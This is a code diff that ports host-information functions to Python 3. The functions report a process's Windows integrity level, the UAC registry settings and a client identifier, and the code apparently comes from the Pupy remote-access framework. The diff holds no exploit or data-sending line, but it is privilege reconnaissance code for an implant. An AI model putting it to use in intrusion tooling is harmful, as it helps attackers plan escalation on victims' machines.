@@ -118,13 +118,13 @@ def get_integrity_level():
     import ctypes
 
     mapping = {
-        0x0000: u'Untrusted',
-        0x1000: u'Low',
-        0x2000: u'Medium',
-        0x2100: u'Medium high',
-        0x3000: u'High',
-        0x4000: u'System',
-        0x5000: u'Protected process',
+        0x0000: 'Untrusted',
+        0x1000: 'Low',
+        0x2000: 'Medium',
+        0x2100: 'Medium high',
+        0x3000: 'High',
+        0x4000: 'System',
+        0x5000: 'Protected process',
     }
 
     BOOL = ctypes.c_long
@@ -146,8 +146,8 @@ def get_integrity_level():
     TokenIntegrityLevel = ctypes.c_int(25)
     ERROR_INSUFFICIENT_BUFFER = 122
 
-    kernel32 = ctypes.windll.WinDLL('kernel32')
-    advapi32 = ctypes.windll.WinDLL('advapi32')
+    kernel32 = ctypes.WinDLL('kernel32')
+    advapi32 = ctypes.WinDLL('advapi32')
 
     GetLastError = kernel32.GetLastError
     GetLastError.argtypes = ()
@@ -237,7 +237,7 @@ def get_integrity_level():
         )
         value = res.contents.value
 
-        return mapping.get(value) or u'0x%04x' % value
+        return mapping.get(value) or '0x%04x' % value
 
     finally:
         CloseHandle(token)
@@ -247,11 +247,17 @@ def getUACLevel():
     if sys.platform != 'win32':
         return 'N/A'
 
-    from _winreg import (
-        ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey,
-        EnumValue, CloseKey
-    )
-
+    if sys.version_info.major > 2:
+        from winreg import (
+            ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey,
+            EnumValue, CloseKey
+        )
+    else:
+        from _winreg import (
+            ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey,
+            EnumValue, CloseKey
+        )
+        
     consentPromptBehaviorAdmin = None
     enableLUA = None
     promptOnSecureDesktop = None
@@ -280,8 +286,8 @@ def getUACLevel():
             except WindowsError:
                 break
 
-    except Exception:
-        return "?"
+    except Exception as e:
+        return "(error={})".format(e)
 
     finally:
         CloseKey(RawKey)
@@ -449,12 +455,12 @@ def get_uuid():
     try:
         uacLevel = getUACLevel()
     except Exception as e:
-        uacLevel = "?"
+        uacLevel = "(error={})".format(e)
 
     try:
         integrity_level = get_integrity_level()
     except Exception as e:
-        integrity_level = "?"
+        integrity_level = "(error={})".format(e)
 
     try:
         if hasattr(pupy, 'cid'):
